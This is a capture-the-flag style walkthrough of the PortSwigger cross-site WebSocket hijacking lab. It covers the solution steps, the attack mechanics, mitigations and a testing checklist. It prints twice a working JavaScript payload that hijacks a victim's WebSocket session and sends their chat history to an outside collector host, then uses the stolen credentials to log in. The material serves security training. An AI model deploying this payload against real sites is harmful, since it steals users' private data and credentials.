# Cross-site WebSocket Hijacking (PortSwigger)

## **Lab: Cross-site WebSocket Hijacking**

**Lab URL:** [PortSwigger - Cross-site WebSocket Hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

***

### **High-Level Summary**

#### **Objective**

Exploit a **cross-site WebSocket hijacking vulnerability** to extract the victim’s chat history and retrieve their login credentials.

#### **Key Techniques & Concepts**

* **WebSockets:** Real-time bidirectional communication between the client and server.
* **CSRF in WebSocket Connections:** The WebSocket handshake lacks CSRF protection, allowing unauthorized cross-origin requests.
* **Exfiltration Attack:** Capturing sensitive data by establishing an unauthorized WebSocket connection.

#### **What Makes This Vulnerable?**

* **No CSRF protection in the WebSocket handshake**, allowing attackers to establish unauthorized WebSocket connections.
* **Cookies with `SameSite=None`**, permitting cross-origin WebSocket requests without restrictions.

***

### **PortSwigger Solution Steps**

#### **Step 1: Interact with the WebSocket Chat**

* Open the **Live Chat** feature and send a message.
* Reload the page to verify that chat messages persist, indicating they are stored on the server.

#### **Step 2: Identify WebSocket Traffic in Burp Suite**

* Open **Burp Suite > Proxy > WebSockets History**.
* Observe that the **"READY"** message retrieves past messages from the chat history.

#### **Step 3: Analyze WebSocket Handshake**

* Inspect the **WebSocket handshake request** in **HTTP History**.
* Confirm that **no CSRF tokens are included** in the WebSocket connection.

#### **Step 4: Construct the Exploit Payload**

* Open **Burp Collaborator** and copy your unique payload URL.
*   Deploy the following JavaScript exploit on the **Exploit Server**:

    ```html
    <script>
      var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
      ws.onopen = function() {
          ws.send('READY');
      };
      ws.onmessage = function(event) {
          fetch('https://YOUR-COLLABORATOR-ID', {
              method: 'POST',
              mode: 'no-cors',
              body: event.data
          });
      };
    </script>
    ```
* Replace `YOUR-LAB-ID` and `YOUR-COLLABORATOR-ID` with the correct URLs.

#### **Step 5: Execute the Exploit**

* Click **View Exploit** to host the script on the **Exploit Server**.
* Send the exploit to the victim and monitor **Burp Collaborator** for chat history exfiltration.

#### **Step 6: Retrieve the Victim's Credentials**

* Locate the victim’s login credentials within the exfiltrated chat history.
* Use the stolen credentials to log in as the victim.

✅ **Lab Completed Successfully**

***

### **Instructor Solution Steps**

#### **Step 1: Examine the WebSocket Chat System**

* Open the chat feature, send a test message, and confirm messages persist after refreshing.

#### **Step 2: Inspect WebSocket Traffic**

* Use **Burp Suite > Proxy > WebSockets History** to observe the WebSocket connection.
* Identify **PING/PONG messages** and confirm the **"READY"** message retrieves chat history.

#### **Step 3: Verify WebSocket Handshake**

* Review the **WebSocket handshake** in **Burp Suite > HTTP History**.
* Confirm that the request:
  * Uses `SameSite=None` cookies.
  * Lacks **CSRF protection**.

#### **Step 4: Deploy the Attack**

*   Place the following **cross-origin WebSocket hijacking payload** on the **Exploit Server**:

    ```html
    <script>
      var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
      ws.onopen = function() {
          ws.send('READY');
      };
      ws.onmessage = function(event) {
          fetch('https://YOUR-COLLABORATOR-ID', {
              method: 'POST',
              mode: 'no-cors',
              body: event.data
          });
      };
    </script>
    ```
* Execute the script and monitor **Burp Collaborator** for leaked messages.

#### **Step 5: Use Stolen Credentials**

* Extract login credentials from the chat history.
* Log in as the victim.

✅ **Lab Completed Successfully**

***

### **Explanation of Payloads and Techniques**

#### **WebSockets Overview**

* WebSockets enable **persistent, real-time communication** between a browser and a server.
* Unlike HTTP, WebSockets do **not require repeated requests**, making them suitable for live chat applications.

#### **Understanding the Attack**

1. **WebSocket Hijacking**:
   * The **attacker’s website initiates a WebSocket connection** to the target server.
   * The browser **automatically sends stored cookies**, including authentication cookies.
   * The WebSocket server **does not validate the origin**, allowing unauthorized access.
2. **Exploiting the “READY” Message**:
   * When the attacker sends **"READY"**, the server responds with the chat history.
   * The attacker captures and forwards this data to **Burp Collaborator**.

#### **Why This Works**

* The **server does not enforce CSRF protection**, allowing unauthorized WebSocket connections.
* The victim’s browser **automatically includes authentication cookies**, granting attacker access.
* `SameSite=None` cookies allow cross-origin WebSocket requests.

#### **Key Indicators of Vulnerability**

* **No CSRF protection** in WebSocket handshake.
* **WebSocket API exposed to external origins**.
* **Session cookies automatically included in cross-origin requests**.

***

### **Real-World WebSocket Hijacking Incidents**

#### **1. Uber’s Real-Time Ride Tracking WebSocket Exploit**

* A WebSocket vulnerability in Uber allowed attackers to **track users' ride locations in real-time**.
* Reference: [Uber WebSocket Vulnerability Report](https://www.zdnet.com/article/uber-fixes-websocket-security-flaw-that-exposed-user-trips/)

#### **2. Cryptocurrency Exchange WebSocket API Breach**

* Attackers leveraged **WebSocket hijacking** to gain unauthorized access to **real-time trade data and balances**.
* Reference: [Crypto Exchange WebSocket Security Flaw](https://portswigger.net/daily-swig/how-broken-websockets-authentication-can-lead-to-security-nightmares)

#### **3. Slack WebSocket Session Hijacking**

* A security flaw in Slack’s WebSocket-based API allowed session hijacking.
* Reference: [Slack WebSocket Security Issue](https://www.hackerone.com/blog/slack-hackerone-security-bounty-program)

***

### **Preventing WebSocket Hijacking**

#### **1. Enforce CSRF Protection**

*   Require **CSRF tokens** in the WebSocket handshake:

    ```javascript
    const ws = new WebSocket('wss://example.com/chat?token=SECURE_CSRF_TOKEN');
    ```

#### **2. Restrict Cross-Origin WebSocket Connections**

*   Validate the `Origin` header:

    ```javascript
    ws.on('connection', (socket, req) => {
        if (req.headers.origin !== 'https://trustedwebsite.com') {
            socket.terminate();
        }
    });
    ```

#### **3. Set Secure Cookies**

*   Enforce `SameSite=Strict` and mark cookies as `Secure`:

    ```
    Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
    ```

#### **4. Implement WebSocket Authentication**

*   Require a **valid token in every WebSocket message**, not just the handshake:

    ```javascript
    ws.onmessage = function(event) {
        const data = JSON.parse(event.data);
        if (!isValidToken(data.token)) {
            ws.close();
        }
    };
    ```

***

### **Penetration Testing Checklist for WebSocket Hijacking**

* [ ] **Inspect WebSocket Handshake** for CSRF protection.
* [ ] **Analyze the `Origin` Header** for unrestricted cross-origin access.
* [ ] **Test for Automatic Cookie Inclusion** in WebSocket requests.
* [ ] **Intercept and Modify WebSocket Messages** using Burp Suite.
* [ ] **Check Session Persistence** after WebSocket disconnection.

***

### **Final Takeaways**

* **WebSocket hijacking occurs when cross-origin WebSocket requests are allowed without CSRF protection.**
* **An attacker can leverage these flaws to steal sensitive data, such as chat histories or credentials.**
* **Mitigation requires proper authentication, CSRF tokens, and cookie security policies.**
